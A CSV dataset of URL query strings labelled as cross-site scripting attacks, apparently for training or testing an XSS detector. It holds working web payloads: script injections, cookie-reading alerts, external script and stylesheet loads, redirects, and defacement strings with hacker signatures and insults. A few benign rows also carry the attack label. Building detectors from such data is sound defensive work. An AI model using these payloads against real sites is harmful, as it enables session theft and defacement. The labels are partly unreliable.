Payload,Label
couleurmessage<br/>=white%20onload=%22alert('xss')%22,1
"lang=';alert(String.fromCharCode(88,83,83))//\';alert(String.fr<br/>omCharCode(88,83,83))//%22;alert(String.fromCharCode(88,83,83))//\%22;alert(String.fromCharCode(88,8<br/>3,83))//--%3E%3C/SCRIPT%3E%22%3E'%3E%3CSCRIPT%3Ealert(String.fromCharCode(88,83,83))%3C/SCRIPT%3E",1
selectcountry=%22;alert('xssed.net');//,1
b=1&was=ort&sign=%22%3E%3Cscript%<br/>3Ealert(1)%3C/script%3E&aktion=abschicken&Senden.x=0&Senden.y=0&Senden=go,1
"p_Query=<br/><script>location.href=""http://www.maliciouswebsite.com"";</script>",1
url=http://www.xssed.com%22%<br/>20onmouseover=%22alert(/xss/)%22?art_ip_action=FlowDispatcher&flowTypeNo=13&pageSeq=1&csNo=10000&key<br/>word=%22%3E&art_servlet_language=en&location=,1
ctxsuch=%22%3E%3Cscript%3Ealert(1)%3C/script%3E&Suchen=Su<br/>chen,1
doSearch=true&suchtext=<br/>%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&x=6&y=7,1
search=%22%3E%3C%2Ftitle%3E%3C%2Fscript%3E%3Cscript%3Ealert%2<br/>81%29%3C%2Fscript%3E&x=5&y=6,1
searchTerm=%22%3E%3Cscript%3Ea<br/>lert%281%29%3C%2Fscript%3E&storeId=10051&catalogId=10051&langId=-1&pageSize=6&beginIndex=0&sType=Sim<br/>pleSearch&resultType=2&searchTermScope=3&searchType=ALL&x=25&y=17,1
keyword=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3<br/>E,1
keywords=%22%3E%3Cscript%3Ealert%281%29%3C%2<br/>Fscript%3E,1
"&cmd=search&pid=1&query=""><script>alert(1)</script>&cate<br/>gory=",1
productId=15328&wtl=s&wtl1=%22%3E%3Cscript%3Eale<br/>rt(1)%3C/script%3E,1
query=%22%3E%3Ciframe%20src=http://www.fbi.gov%3E,1
keywords=%22%3E%3C%2Ftitle%3E%3C%2Fscript%3E%3Cscript%3E<br/>alert%281%29%3C%2Fscript%3E+%22onmouseover%3D%22alert%281%29%22+onmouseover%3Dalert%281%29&x=29&y=13,1
SESSID=6c623b3a37172bc2b3fa7c3902703290&w=%22%3E%3C%2Ftitle%3E%3<br/>C%2Fscript%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E+%22onmouseover%3D%22alert%281%29%22+onmouseover<br/>%3Dalert%281%29&x=16&y=9,1
parentId=-358f242a-1143ff68812-220&query=%22%3E%3Cscript%3Ealer<br/>t%281%29%3C%2Fscript%3E&submit.x=25&submit.y=8&submit=image,1
ns=1&sns=0&searchtype=fo-kw&searchtext=%5C%22%3E%3C%2Ftitle%3E%3C<br/>%2Fscript%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E+%5C%22onmouseover%3D%5C%22alert%281%29%5C%22+onm<br/>ouseover%3Dalert%281%29,1
q=xss%22%20onmouseover=%22alert(1)%22&pt=initial&lang=1031&cc=DE&u=,1
mode=search,1
searchfor=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E,1
section=shop&qh=boost%3Apopular&q=%22%3E%3Cscript%3Ealert%281%29%3C%2F<br/>script%3E,1
"searWords=""><script>alert(""Daemian"")</script>&Send=Search",1
searchKeywords=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscri<br/>pt%3E&gosearch.x=10&gosearch.y=10&resultsPerPage=10&resultsPage=1,1
ps=10&q=%22%3E%3Cscript%3Ealer<br/>t%281%29%3C%2Fscript%3E&ps=10&m=all&ul=%2Fen%2F,1
<br/>subject=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&vicinitySearch=on&distance=0&location=k%F6ln+5<br/>1103&suchen=Suchen,1
prenom=%22%3E%3Cl<br/>ink%20href=http://starext.by.ru/css.css%20type=text/css%20rel=stylesheet%3E,1
ui_mode=question&charset=UTF-8&language=en&province=O<br/>N&support=false&lob=consumer&faq=false&prior_transaction_id=2388&facetReset=true&question_box=%22%3E<br/>%3C%2Ftitle%3E%3C%2Fscript%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E+%22onmouseover%3D%22alert%281%2<br/>9%22+onmouseover%3Dalert%281%29,1
cmd=search&SearchForm=%%SearchForm%%&fuzzy=&fuzziness=4&stemming<br/>=&phonic=&natLang=&maxFiles=500&autoStopLimit=500&sort=Date&srcrequest=%22%3E%3Cscript%3Ealert(1)%3C<br/>/script%3E&submit.x=0&submit.y=0&submit=Go,1
q=%22%3E%3Clink%20href=http://starext.by.ru/css.css%20type=text<br/>/css%20rel=stylesheet%3E,1
"task=""><script>alert(document.cookie)</script>",1
nom=%22%3E%3Cma<br/>rquee%3E%3Ch1%3Estarext%3C/h1%3E%3C/marquee%3E,1
q=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&x=10&y=16,1
email=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscrip<br/>t%3E&submit2.x=25&submit2.y=15&submit2=submit,1
origine_inscript<br/>ion=&service=forums&theme=notrefamille&redirect=%22%3E%3Clink%20href=http://starext.by.ru/css.css%20<br/>type=text/css%20rel=stylesheet%3E,1
SET=locator&CID=61&LANG=DEU&STYLE=d_deichmann&todo=showLocatio<br/>nList&state=locationInput&LIST_COUNT=10&DEVICECHECK=0&SEARCH_0=DSD&SHOW_MAP=1&ID_0=0&GEOX_0=0&GEOY_0<br/>=0&STATUS_0=RED&CTRY_0=D&ZIP_0=%22%3E%3Cscript%3Ealert(1)%3C/script%3E&CITY_0=&CITY2_0=&STREET_0=&HO<br/>USENO_0=&MAX_LOC=5&MAX_DIST=10&image.x=0&image.y=0&image=Anfrage%2bstarten,1
req=%3C%2Ftitle%3E%3Cbody+onload%3D%22alert%281%29%22%3E&art=1&news=<br/>1,1
"ref=//>""><ScRiPt>alert(document.domain)</ScRiPt>",1
theme=notrefamille&service=forum<br/>&redirect=%22%3E%3Clink%20href=http://starext.by.ru/css.css%20type=text/css%20rel=stylesheet%3E,1
SESSID=e8e97c4d64adfb8251eba7e7aa0ffa89&p=Q&ts=custom&<br/>w=%22%3E%3C%2Ftitle%3E%3C%2Fscript%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E+%22onmouseover%3D%22ale<br/>rt%281%29%22+onmouseover%3Dalert%281%29&x=14&y=7,1
hp_sb_cruise|http://www.google.be,1
"page=http://www<br/>.google.be%22 onmouseover=""alert('xss')",1
words=%5C%22%3E%3Cscript+src%3Dhttp%3A%2F%2Fzucker.schokokeks.<br/>org%2F%7Elars%2Fi.js%3E%3C%2Fscript%3E,1
service=genealogie-en-ligne<br/>&methode=email&email=%22%3E%3Clink%20href=http://starext.by.ru/css.css%20type=text/css%20rel=stylesh<br/>eet%3E&reponse=nontrouve,1
"http://www.google.be%22 onmouseover=""alert('xss')""",1
id=72157600146202716&title=%3Cmarquee%3EHacked<br/>%20By%20cr0xip,1
lastname<br/>=%22%3E%3Clink%20href=http://starext.by.ru/css.css%20type=text/css%20rel=stylesheet%3E,1
showlinks=1&viewmode=0&upload_session=%3E'%3E%3CScRiPt%20%0a%0d%3Ealert(133337)%<br/>3B%3C/ScRiPt%3E,1
"searchtext=""><script>alert(0)</script>",1
q=%22%3E%3Clink%20href=http://starext.by.ru/css.css%20type=text/css<br/>%20rel=stylesheet%3E,1
q=%22%3Ehttp://www.dosya.in/search.php?q=%22%3E%3Clink%20href=http:<br/>//starext.by.ru/css.css%20type=text/css%20rel=stylesheet%3E,1
q=%3Clink%20href=http://starext.by.ru/css.css%20type=text/css%20rel<br/>=stylesheet%3E,1
q=%22%3Ehttp://www.pasoindir.com/search.php?q=%22%3E%3Clink%20href=h<br/>ttp://starext.by.ru/css.css%20type=text/css%20rel=stylesheet%3E,1
sayfa=oylama&fikra_no=<h1>Cyb3rS0ft-Thefucker-Newyork%20<h3>Was%20<br/>Here,1
q=%22%3E%3Clink%20href=http://starext.by.ru/css.css%20type=text/css%2<br/>0rel=stylesheet%3E,1
q=%22%3E%3Clink%20href=http://starext.by.ru/css.css%20type=text/css%<br/>20rel=stylesheet%3E,1
search=%22%3E%3Cscript%3Ealert('xss')%3C/script%3E%3C%22,1
pageid=popchartbullion&comdyClass=b&comdyCode=gbx&comdyDesc=%3<br/>Cscript%3Ealert('Hello%20World');%3C/script%3E&nomLast=664.0&nomChg=3.0,1
"s_catid=';alert(String.fromCharCode(88,83,83))//\';alert(String.<br/>fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,<br/>83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",1
name=%3CSCRIPT%3Ealert%28%27Indian-%20Anti-Ha<br/>cking%20-Group%27%29%3C%2FSCRIPT%3E&Submit=Get+Invoice,1
dms=11&param1=tour&catid=7&msg=%3CSCRIPT%3Ealert('Norehem%20WaS%<br/>20HeRe!!')%3C/SCRIPT%3E%3CH1%3E%3CH1%3E%3CH1%3E%3Cmarquee%3ENorehem%20was%20here%3C/marquee%3E%3C/H1<br/>%3E%3C/H1%3E%3C/H1%3E%3CCENTER%3E%3CIMG%20SRC=%22http://www.cibernautica.com/forocibernautica/upload<br/>/norehemzu4.gif%22%3E%3C/CENTER%3E,1
XX=%3CSCRIPT%3Ealert('Norehem%20WaS%20HeRe!!')%3C/SCRIPT%3E%3CH1%3E%3C<br/>H1%3E%3CH1%3E%3Cmarquee%3ENorehem%20was%20here%3C/marquee%3E%3C/H1%3E%3C/H1%3E%3C/H1%3E%3CCENTER%3E%<br/>3CIMG%20SRC=%22http://www.cibernautica.com/forocibernautica/upload/norehemzu4.gif%22%3E%3C/CENTER%3E,1
query=%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E,1
q=%22%3E%3Clink%20href=http://starext.by.ru/css.css%20type=text/<br/>css%20rel=stylesheet%3E,1
archive=<h1><marquee>ownz%20by%20ertuqrul,1
"jst=""><script>alert(""CYBER"")</<br/>script>",1
"Kategori=4&Kelime=""</script><script>alert(/THE-SH0CK-B0Y/<br/>)</script>",1
"jst=""><script>alert(""CYBER"")</script>",1
"jst=""><script>alert(""CYBER"")</scr<br/>ipt>",1
SSFunction=%3Cscript%3Ealert(document.cook<br/>ie);%3C/script%3E&orderFormFileName=workspaceForm.html,1
cadena=%22%3E%3Cscript%3Ealert(/xss/);%3C/script%3E,1
msg=%3CSCRIPT%3Ealert('Norehem%20WaS%20HeRe!!')%3C/SC<br/>RIPT%3E%3CH1%3E%3CH1%3E%3CH1%3E%3Cmarquee%3ENorehem%20was%20here%3C/marquee%3E%3C/H1%3E%3C/H1%3E%3C/<br/>H1%3E%3CCENTER%3E%3CIMG%20SRC=%22http://www.cibernautica.com/forocibernautica/upload/norehemzu4.gif%<br/>22%3E%3C/CENTER%3E,1
lngBrandID=5156&lngCityID=&strDistrict=%22%3E%3C/script<br/>%3E%3Ch1%3EBy+candark%3C/h1%3E,1
"jst=""><script>alert(""CYB<br/>ER"")</script>",1
"jst=""><script>alert(""CYBER"")<<br/>/script>",1
hid=352484%22%3E%3Ch1%3ESt@rExT%3C/h1%3E,1
query=%3C%2Ftitle%3E%3Cbody+onload%3Djavascript<br/>%3Aalert%28%2Fxss%2F%29%3E%3Ctitle%3E&old_query=%3C%2Ftitle%3E%3Cscript%3Ealert%28%2Fxss%29%3B%3C%2F<br/>script%3E,1
id=386,1
"q=<h1><marquee>The_0nuR%20Was%20Here</marquee></h1><script>alert(""0nu<br/>R%20Was%20heRe"")</script>",1
"search=""><s<br/>cript>alert(1);</script>",1
compID=10&searchPerformed=yes&only_photos=0&is_advanced<br/>=0&srch_year=&srch_range=&srch_colour=&srch_doors=&srch_metallic=&srch_keywords=&srch_mileage=&srch_<br/>mileage_range=&make=ANY&model=ANY&minprice=&maxprice=&postcode=%22%3E%3Cscript%3Ealert%281%29%3B%3C%<br/>2Fscript%3E&distance=40,1
a=newcc&r=%22%3E%3Cscript%3Ealert(%22siktir<br/>in%20gidin%20a.q%20reverse%20ip%20paral%FDym%FD%FE%22)%3C/script%3E,1
palabra=%22%3E%3Cscript%3Ealert(/xss/);<br/>%3C/script%3E,1
ID_NEG_MENU=20&nomeCasa=Cano<br/>n&Categoria=Multifunzione+laser&modello=%3Cscript%3Ealert('xssed')%3C/script%3E&catcode=TSL&famiglia<br/>= %3Cscript%3Ealert('xssed')%3C/script%3E,1
"jst=""<br/>><script>alert(""CYBER"")</script>",1
"prt=<script>alert(""starext"")</script>",1
pislick=arama&o=aradim&aranan=%3Ctitle%3EFucked+%3C/title%3E%3Cscript%3Ea<br/>lert(%22A.q+Emmi+siz+t%FCrk+vatanda%FElar%FDm%FDza+hizmet+ediyorsunuz+pislick+ne+demek+t%FCrk%E7emiz<br/>in+i%E7ine+etiniz+dillerde+k%FDro+%FEeklinde+bir+marka+b%FDrakt%FDn%FDz+pislickmi%FE+a.q+avrupa+%F6z<br/>entileri+www.google.com%22)%3C/script%3E%3Ch1%3E%3Cfont%20color=darkred%3EA.q+Emmi+siz+t%FCrk+vatand<br/>a%FElar%FDm%FDza+hizmet+ediyorsunuz+pislick+ne+demek+t%FCrk%E7emizin+i%E7ine+etiniz+dillerde+k%FDro+<br/>%FEeklinde+bir+marka+b%FDrakt%FDn%FDz+pislickmi%FE+a.q+avrupa+%F6zentileri+%3Cbr%3Ewww.google.com%20<br/>bekleriz%3C/h1%3E,1
start=40&s=%3Cscript%3Ealert(document.cookie)%3C/script%3E&sin=ddtt,1
"searchkey=SEARCH_ID_JOBS&sort=0&JOB_TITLE=&LOCATION=""><script<br/>>alert(1);</script>",1
"search=""><script>alert(1);</script>&type=server&game=cstrike2<br/>http://www.counter-engine.com/index.php?exact=ON&req=search&term=""><script>alert(1);</script>",1
"yider='<script>alert(""Ahmadinejad Is A<br/>Cro-Mag"");</script>",1
"jst=""><<br/>script>alert(""CYBER"")</script>",1
sayfa=whois,1
offset=0&make=&model=+&MinPrice=null&MaxPrice=null&Post<br/>Code=%22%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E&distance=1000&Order=Price&trim=Variant+e.g.+%2<br/>82.0+GTI%29&keyword=+Type+a+keyword...&colour=Any+Colour&view=Gallery&searchtype=Normal&doors=&fuel=<br/>&bodystyle=Body+Style&transmission=Transmission&maxage=100,1
action=%22%22%22%22%<br/>22%22%3CSCRIPT%3Ealert('Norehem%20WaS%20HeRe!!')%3C/SCRIPT%3E%3CH1%3E%3CH1%3E%3CH1%3E%3Cmarquee%3ENo<br/>rehem%20was%20here%3C/marquee%3E%3C/H1%3E%3C/H1%3E%3C/H1%3E%3CCENTER%3E%3CIMG%20SRC=%22http://www.ci<br/>bernautica.com/forocibernautica/upload/norehemzu4.gif%22%3E%3C/CENTER%3E,1
act=msg&f=%3CSCRIPT%3Ealert('Norehem%20WaS%20HeRe!!')%3C/SCRIPT%<br/>3E%3CH1%3E%3CH1%3E%3CH1%3E%3Cmarquee%3ENorehem%20was%20here%3C/marquee%3E%3C/H1%3E%3C/H1%3E%3C/H1%3E<br/>%3CCENTER%3E%3CIMG%20SRC=%22http://www.cibernautica.com/forocibernautica/upload/norehemzu4.gif%22%3E<br/>%3C/CENTER%3E,1
newlang=portuguese&sujet=%3CSCRIPT%3Ealert('Norehem%20WaS%20HeRe!!'<br/>)%3C/SCRIPT%3E%3CH1%3E%3CH1%3E%3CH1%3E%3Cmarquee%3ENorehem%20was%20here%3C/marquee%3E%3C/H1%3E%3C/H1<br/>%3E%3C/H1%3E%3CCENTER%3E%3CIMG%20SRC=%22http://www.cibernautica.com/forocibernautica/upload/norehemz<br/>u4.gif%22%3E%3C/CENTER%3E&msg=A%20l%5C'attention%20de%20Jean%20Alain%20M.%20PENDA&PHPSESSID=%3CSCRIP<br/>T%3Ealert('Norehem%20WaS%20HeRe!!')%3C/SCRIPT%3E%3CH1%3E%3CH1%3E%3CH1%3E%3Cmarquee%3ENorehem%20was%2<br/>0here%3C/marquee%3E%3C/H1%3E%3C/H1%3E%3C/H1%3E%3CCENTER%3E%3CIMG%20SRC=%22http://www.cibernautica.co<br/>m/forocibernautica/upload/norehemzu4.gif%22%3E%3C/CENTER%3E,1
Fatal=0&Severity=3&Category=3&EventID=3201&Hid<br/>eResetBtn=0&HideDetails=1&Msg=%3CSCRIPT%3Ealert('Norehem%20WaS%20HeRe!!')%3C/SCRIPT%3E%3CH1%3E%3CH1%<br/>3E%3CH1%3E%3Cmarquee%3ENorehem%20was%20here%3C/marquee%3E%3C/H1%3E%3C/H1%3E%3C/H1%3E%3CCENTER%3E%3CI<br/>MG%20SRC=%22http://www.cibernautica.com/forocibernautica/upload/norehemzu4.gif%22%3E%3C/CENTER%3E,1
msg=%3CSCRIPT%3Ealert('Norehem%20WaS%20He<br/>Re!!')%3C/SCRIPT%3E%3CH1%3E%3CH1%3E%3CH1%3E%3Cmarquee%3ENorehem%20was%20here%3C/marquee%3E%3C/H1%3E%<br/>3C/H1%3E%3C/H1%3E%3CCENTER%3E%3CIMG%20SRC=%22http://www.cibernautica.com/forocibernautica/upload/nor<br/>ehemzu4.gif%22%3E%3C/CENTER%3E,1
days=-1&topic=%22%3E%3Cimg%20src=%22x%22%20onerror=%22alert(1)<br/>%22%3E,1
q=%3CSCRIPT%3E%3C/SCRIPT%3E%3CSCRIPT%3Ealert('N<br/>orehem%20WaS%20HeRe!!')%3C/SCRIPT%3E%3CH1%3E%3CH1%3E%3CH1%3E%3Cmarquee%3ENorehem%20was%20here%3C/mar<br/>quee%3E%3C/H1%3E%3C/H1%3E%3C/H1%3E%3CCENTER%3E%3CIMG%20SRC=%22http://www.cibernautica.com/forocibern<br/>autica/upload/norehemzu4.gif%22%3E%3C/CENTER%3E&c=0,1
method=log&logerror=%3CSCRIPT%3Ealert('Norehem%20WaS%20HeRe!!')<br/>%3C/SCRIPT%3E%3CH1%3E%3CH1%3E%3CH1%3E%3Cmarquee%3ENorehem%20was%20here%3C/marquee%3E%3C/H1%3E%3C/H1%<br/>3E%3C/H1%3E%3CCENTER%3E%3CIMG%20SRC=%22http://www.cibernautica.com/forocibernautica/upload/norehemzu<br/>4.gif%22%3E%3C/CENTER%3E,1
q=%22%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E&sa=Search&cx<br/>=012943277593349087480%3Axx9wfuef0se&cof=FORID%3A11&searchIn=x,1
keyword=%22%22%22%3CSCRIPT%3Ealert('Norehem%20WaS%20HeRe!!')%3C/S<br/>CRIPT%3E%3CH1%3E%3CH1%3E%3CH1%3E%3Cmarquee%3ENorehem%20was%20here%3C/marquee%3E%3C/H1%3E%3C/H1%3E%3C<br/>/H1%3E%3CCENTER%3E%3CIMG%20SRC=%22http://www.cibernautica.com/forocibernautica/upload/norehemzu4.gif<br/>%22%3E%3C/CENTER%3E,1
Fatal=0&Severity=3&Category=3&EventID<br/>=3201&HideResetBtn=0&HideDetails=1&Msg=%3CSCRIPT%3Ealert('Norehem%20WaS%20HeRe!!')%3C/SCRIPT%3E%3CH1<br/>%3E%3CH1%3E%3CH1%3E%3Cmarquee%3ENorehem%20was%20here%3C/marquee%3E%3C/H1%3E%3C/H1%3E%3C/H1%3E%3CCENT<br/>ER%3E%3CIMG%20SRC=%22http://www.cibernautica.com/forocibernautica/upload/norehemzu4.gif%22%3E%3C/CEN<br/>TER%3E,1
tid=54963&instrument=guitar&artist=%3CSCRIPT%3Ealert('Norehem<br/>%20WaS%20HeRe!!')%3C/SCRIPT%3E%3CH1%3E%3CH1%3E%3CH1%3E%3Cmarquee%3ENorehem%20was%20here%3C/marquee%3<br/>E%3C/H1%3E%3C/H1%3E%3C/H1%3E%3CCENTER%3E%3CIMG%20SRC=%22http://www.cibernautica.com/forocibernautica<br/>/upload/norehemzu4.gif%22%3E%3C/CENTER%3E&song=,1
msg=Norehem%20was%20here%20%20%20&cl=rainbow3,1
Fatal=0&Severity=3&Category=3&EventID=3201&HideR<br/>esetBtn=0&HideDetails=1&Msg=%3CSCRIPT%3Ealert('Norehem%20WaS%20HeRe!!')%3C/SCRIPT%3E%3CH1%3E%3CH1%3E<br/>%3CH1%3E%3Cmarquee%3ENorehem%20was%20here%3C/marquee%3E%3C/H1%3E%3C/H1%3E%3C/H1%3E%3CCENTER%3E%3CIMG<br/>%20SRC=%22http://www.cibernautica.com/forocibernautica/upload/norehemzu4.gif%22%3E%3C/CENTER%3E,1
Fatal=0&Severity=3&Category=3&EventID=3201&HideRese<br/>tBtn=0&HideDetails=1&Msg=%3CSCRIPT%3Ealert('Norehem%20WaS%20HeRe!!')%3C/SCRIPT%3E%3CH1%3E%3CH1%3E%3C<br/>H1%3E%3Cmarquee%3ENorehem%20was%20here%3C/marquee%3E%3C/H1%3E%3C/H1%3E%3C/H1%3E%3CCENTER%3E%3CIMG%20<br/>SRC=%22http://www.cibernautica.com/forocibernautica/upload/norehemzu4.gif%22%3E%3C/CENTER%3E,1
cmd=static&chId=30&path=%2Fsearch%2Fsearch_engine.jsp&keyWor<br/>ds=%3C%2FTITLE%3E%3Cscript%3Ealert%28%27XSS%27%29%3B%3C%2Fscript%3E&id=&maxDocs=&channelsId=bdol%7Cp<br/>rofessionisti%7Cinformazione%7Cborsa%7C47%7C33%7C30%7C32%7C43%7C40%7C35&querySearch=&orderByString=D<br/>ata+desc&criteria=1&pageNumber=1&simili=&queryString=+%28++%22%27%3E%3Cscript%3Ealert%28%27XSS%27%29<br/>%3B%3C%2Fscript%3E%22++%3CIN%3E+%28Titolo%2C+Testo%29+%3CAND%3E+Data+%3C%3D+29%2F7%2F2007+%29+%3CAND<br/>%3E+%28canale+%21%3D+null+%3Cor%3E+sole4dotcom%29&channels=bdol%7Cprofessionisti%7Cinformazione%7Cbo<br/>rsa%7C47%7C33%7C30%7C32%7C43%7C40%7C35&docsNumber=0&action=&chiaviSelezionate=&description=&flagPart<br/>ialResult=,1
s=%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%<br/>2F%5C%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%22%3Balert%28String.fromCharCode%2<br/>888%2C83%2C83%29%29%2F%2F%5C%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F--%3E%3C%2FS<br/>CRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E&Invi<br/>a.x=0&Invia.y=0&Invia=Avvia+la+ricerca,1
Fatal=0&Severity=3&Category=3&EventID=32<br/>01&HideResetBtn=0&HideDetails=1&Msg=%3CSCRIPT%3Ealert('Norehem%20WaS%20HeRe!!')%3C/SCRIPT%3E%3CH1%3E<br/>%3CH1%3E%3CH1%3E%3Cmarquee%3ENorehem%20was%20here%3C/marquee%3E%3C/H1%3E%3C/H1%3E%3C/H1%3E%3CCENTER%<br/>3E%3CIMG%20SRC=%22http://www.cibernautica.com/forocibernautica/upload/norehemzu4.gif%22%3E%3C/CENTER<br/>%3E,1
cx=016241607655231339373%3Ax40el6vmrtm&cof=FORID%3A9&q=%22%3E%<br/>27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%27%3Balert%28String.fromCharCode%2888<br/>%2C83%2C83%29%29%2F%2F%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%22%3Balert%28S<br/>tring.fromCharCode%2888%2C83%2C83%29%29%2F%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28Str<br/>ing.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E&sa=Trova+su+Panorama,1
Fatal=0&Severity=3&Category=3&EventID=3201&Hide<br/>ResetBtn=0&HideDetails=1&Msg=%3CSCRIPT%3Ealert('Norehem%20WaS%20HeRe!!')%3C/SCRIPT%3E%3CH1%3E%3CH1%3<br/>E%3CH1%3E%3Cmarquee%3ENorehem%20was%20here%3C/marquee%3E%3C/H1%3E%3C/H1%3E%3C/H1%3E%3CCENTER%3E%3CIM<br/>G%20SRC=%22http://www.cibernautica.com/forocibernautica/upload/norehemzu4.gif%22%3E%3C/CENTER%3E,1
azione=cerca&strcerca=%27%3Balert%28String.fromCharCode%2888%2C8<br/>3%2C83%29%29%2F%2F%5C%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%22%3Balert%28Strin<br/>g.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2<br/>F%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%<br/>2FSCRIPT%3E,1
txttexto=%3Cscript%3Ealert(/xss/);%3C/script%3E,1
"chave=""><script>alert(""ok<br/>"");</script>",1
sf=%3Cscript%3Ealert('Hello%20World')%3C/script%3E,1
"skin=""><script>alert(""fucked"")</script>",1
f=%22%2Balert%28\'Fucked+by+Mister+C\'%29%<br/>2B%22&id=%22%2Balert%28\'XSS+flows\'%29%2B%22&k=%22%2Balert%28\'xss\'%29%2B%22,1
print=%22%20style=-moz-binding:url(http://zucker.schokokeks.org/~lars/xss/<br/>username.xml%23username)%20style=%22,1
refine_Ntt=%22%3E%3Cscript%3Ealert(1)%3C/script%3E&re<br/>fine_orig_Ntt=&refine_orig_Ntk=All&refine_orig_Ntx=mode+matchallpartial&refine_Ntk=All&refine_Ntx=mo<br/>de+matchallpartial&type=articles&x=0&y=0,1
search=<script>alert('xss - Aitoc')</script>&category=50,1
"p=Q&ts=v7&w=""><script>alert(/THE-SH0CK-B0Y/)</script>",1
action=find&find=%3C%2Ftitle%3E%3Cscript%3Ealert%28document.cookie%2<br/>9%3C%2Fscript%3E&x=14&y=6,1
month=3&day=9&year=2007%22%3E%3Cstyle%3E%3Cmarquee%3Ehackedbycyber-hell.org{ha<br/>ckedbycyber-hell.org,1
_nfpb=true&search_actionOverride=%3Cscript%3Ealert('Hello%20W<br/>orld!')%3C/script%3E&_windowLabel=search,1
searchString=%%22%3E%3Cscript%3Ealert('Xssed%20By%20Dar<br/>kworm');%3C/script%3E,1
s=%3CSCRIPT%3Ealert('Norehem%20WaS%20HeRe!!')%3C/SCR<br/>IPT%3E%3CH1%3E%3CH1%3E%3CH1%3E%3Cmarquee%3ENorehem%20was%20here%3C/marquee%3E%3C/H1%3E%3C/H1%3E%3C/H<br/>1%3E%3CCENTER%3E%3CIMG%20SRC=%22http://www.cibernautica.com/forocibernautica/upload/norehemzu4.gif%2<br/>2%3E%3C/CENTER%3E,1
path=../ecard/images/i/i1.gif&ttl=Invita<br/>tion&msg=%3CSCRIPT%3Ealert('Norehem%20WaS%20HeRe!!')%3C/SCRIPT%3E%3CH1%3E%3CH1%3E%3CH1%3E%3Cmarquee%<br/>3ENorehem%20was%20here%3C/marquee%3E%3C/H1%3E%3C/H1%3E%3C/H1%3E%3CCENTER%3E%3CIMG%20SRC=%22http://ww<br/>w.cibernautica.com/forocibernautica/upload/norehemzu4.gif%22%3E%3C/CENTER%3E,1
